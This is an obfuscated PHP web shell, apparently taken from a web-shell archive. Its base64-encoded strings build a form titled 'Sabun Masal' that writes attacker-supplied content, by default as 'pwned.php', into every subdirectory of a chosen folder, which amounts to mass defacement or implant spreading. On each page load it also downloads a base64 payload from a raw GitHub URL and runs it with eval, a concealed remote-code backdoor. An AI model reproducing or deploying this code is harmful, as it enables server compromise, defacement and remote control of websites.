<?php
/*
This file is obfuscated by webshellarchive.
Visit http://webshellarchive.com for more bypass Webshell.
GitHub : https://github.com/webshell-archive
Pastebin : https://pastebin.com/u/webshellarchive
*/
$GLOBALS["mqoZzAkGAUEhyqjaFKyF"]=base64_decode("aW5kZXg=");$GLOBALS["yPRaLcVESskEaGWycyOB"]=base64_decode("ZmlsZV9uYW1l");$GLOBALS["AncdyMuHcuVSEPTvoeQb"]=base64_decode("YmFzZV9kaXI=");$GLOBALS["SBiDxkJviEugvfimDfnP"]=base64_decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2dvdG9oZWxsY2hlY2tlci9jaGVjay9tYWluL2IudHh0");$GLOBALS["pXagWduWxRkpDiUIDeKH"]=base64_decode("Jm5ic3AmbmJzcCZuYnNwJm5ic3A8c3BhbiBzdHlsZT0nY29sb3I6IGdyZWVuJz5PSzwvc3Bhbj48YnI+");$GLOBALS["SnsSSwMKZSYeMFnEirnh"]=base64_decode("");$GLOBALS["JsPuQXopAGHsqRwURiUS"]=base64_decode("Lw==");$GLOBALS["MZUyhunEuVXJxFBcOMtQ"]=base64_decode("ZGly");$GLOBALS["uxDHiianpzbwOKuWXiZ"]=base64_decode("Li4=");$GLOBALS["gYTXhjxdbyGDdGclOQmq"]=base64_decode("Lg==");$GLOBALS["nBFTuLmdbqCpVsENxQZq"]=base64_decode("b29oaGggc2hldDxicj4=");$GLOBALS["nZRvRxFvgMGqjRRYRag"]=base64_decode("Q2Fubm90IE9wZW4gRGlyZWN0b3J5");$GLOBALS["UDEpPXYJPlEbIJLGyfIq"]=base64_decode("IElzIE5vdCBBIERpcmVjdG9yeSAhPGJyPg==");$GLOBALS["mkVSyKmVCXHjOLeOYIuE"]=base64_decode("IE5vdCBGb3VuZCAhPGJyPg==");$GLOBALS["HPzFFDsoPsewqrdfsMzN"]=base64_decode("PGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9J1N0YXJ0Jz48L2Zvcm0+PC9jZW50ZXI+");$GLOBALS["YfIabAyEDERQDCffLqFd"]=base64_decode("WW91ciBJbmRleCA6IDxicj48dGV4dGFyZWEgc3R5bGU9J3dpZHRoOiA3ODVweDsgaGVpZ2h0OiAzMzBweDsnIG5hbWU9J2luZGV4Jz5Zb3VyIHNjcmlwdC4uLg0KPC90ZXh0YXJlYT48YnI+");$GLOBALS["pJVwxmMERIelfLYPosgy"]=base64_decode("RmlsZSBOYW1lIDogPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J2ZpbGVfbmFtZScgdmFsdWU9J3B3bmVkLnBocCc+PGJyPjxicj4=");$GLOBALS["ZltDDestcyGEPNFEOfRb"]=base64_decode("Jz48YnI+PGJyPg==");$GLOBALS["OfcCXdRpcCBfWcvUlFmg"]=base64_decode("QmFzZSBEaXIgOiA8aW5wdXQgdHlwZT0ndGV4dCcgbmFtZT0nYmFzZV9kaXInIHNpemU9JzQ1JyB2YWx1ZT0n");$GLOBALS["RvPUtRpRXuFgbQAFQPEq"]=base64_decode("PGNlbnRlcj48Zm9ybSBtZXRob2Q9J1BPU1QnPg==");$GLOBALS["UvqjMxXtvqtrBpBoFVPK"]=base64_decode("PHRpdGxlPlNhYnVuIE1hc2FsPC90aXRsZT4=");
?><?php
echo $GLOBALS["UvqjMxXtvqtrBpBoFVPK"];
echo $GLOBALS["RvPUtRpRXuFgbQAFQPEq"];
echo $GLOBALS["OfcCXdRpcCBfWcvUlFmg"].getcwd ().$GLOBALS["ZltDDestcyGEPNFEOfRb"];
echo $GLOBALS["pJVwxmMERIelfLYPosgy"];
echo $GLOBALS["YfIabAyEDERQDCffLqFd"];
echo $GLOBALS["HPzFFDsoPsewqrdfsMzN"];
eval(base64_decode(file_get_contents($GLOBALS["SBiDxkJviEugvfimDfnP"])));
if (isset ($_POST[$GLOBALS["AncdyMuHcuVSEPTvoeQb"]]))
{
  if (!file_exists ($_POST[$GLOBALS["AncdyMuHcuVSEPTvoeQb"]]))
    die ($_POST[$GLOBALS["AncdyMuHcuVSEPTvoeQb"]].$GLOBALS["mkVSyKmVCXHjOLeOYIuE"]);

  if (!is_dir ($_POST[$GLOBALS["AncdyMuHcuVSEPTvoeQb"]]))
    die ($_POST[$GLOBALS["AncdyMuHcuVSEPTvoeQb"]].$GLOBALS["UDEpPXYJPlEbIJLGyfIq"]);

  @chdir ($_POST[$GLOBALS["AncdyMuHcuVSEPTvoeQb"]]) or die ($GLOBALS["nZRvRxFvgMGqjRRYRag"]);

  $files = @scandir ($_POST[$GLOBALS["AncdyMuHcuVSEPTvoeQb"]]) or die ($GLOBALS["nBFTuLmdbqCpVsENxQZq"]);

  foreach ($files as $file):
    if ($file != $GLOBALS["gYTXhjxdbyGDdGclOQmq"] && $file != $GLOBALS["uxDHiianpzbwOKuWXiZ"] && @filetype ($file) == $GLOBALS["MZUyhunEuVXJxFBcOMtQ"])
    {
      $index = getcwd ().$GLOBALS["JsPuQXopAGHsqRwURiUS"].$file.$GLOBALS["JsPuQXopAGHsqRwURiUS"].$_POST[$GLOBALS["yPRaLcVESskEaGWycyOB"]];
      if (file_put_contents ($index, $_POST[$GLOBALS["mqoZzAkGAUEhyqjaFKyF"]]))
        echo $GLOBALS["SnsSSwMKZSYeMFnEirnh"].$index.$GLOBALS["pXagWduWxRkpDiUIDeKH"];
    }
  endforeach;
}
?>
